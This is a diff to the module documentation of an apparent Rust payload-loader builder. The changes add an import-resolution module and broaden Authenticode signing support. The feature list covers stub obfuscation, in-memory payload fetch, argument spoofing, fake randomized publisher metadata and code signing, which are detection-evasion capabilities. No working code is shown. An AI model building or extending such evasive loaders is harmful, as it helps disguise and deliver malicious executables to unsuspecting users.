@@ -8,6 +8,8 @@
 //! - `obfuscation`: string obfuscation for stub literals.
 //! - `compiler`: stub compilation with `rustc`.
 //! - `fetch`: in-memory HTTP(S) fetch of the input payload (URL input).
+//! - `api_resolution`: how the loader resolves the payload's imports
+//!   (`build.stub.api_resolution`) — the proxy catalogue and its validation.
 //! - `args`: payload command-line construction and argument spoofing.
 //! - `manifest`: the build manifest (provenance record written next to the
 //!   artifact).
@@ -15,8 +17,10 @@
 //! - `identity`: plausible randomized metadata (company, product, versions).
 //! - `resources`: PE resources (icon, `VERSIONINFO`, application manifest)
 //!   built in Rust and written into a `.rsrc` section.
-//! - `signing`: optional Authenticode signing of the artifact via `signtool`.
+//! - `signing`: optional Authenticode signing of the artifact (`signtool` on
+//!   Windows, `osslsigncode` elsewhere, including the Docker image).
 
+pub mod api_resolution;
 pub mod args;
 pub mod compiler;
 pub mod crypto;
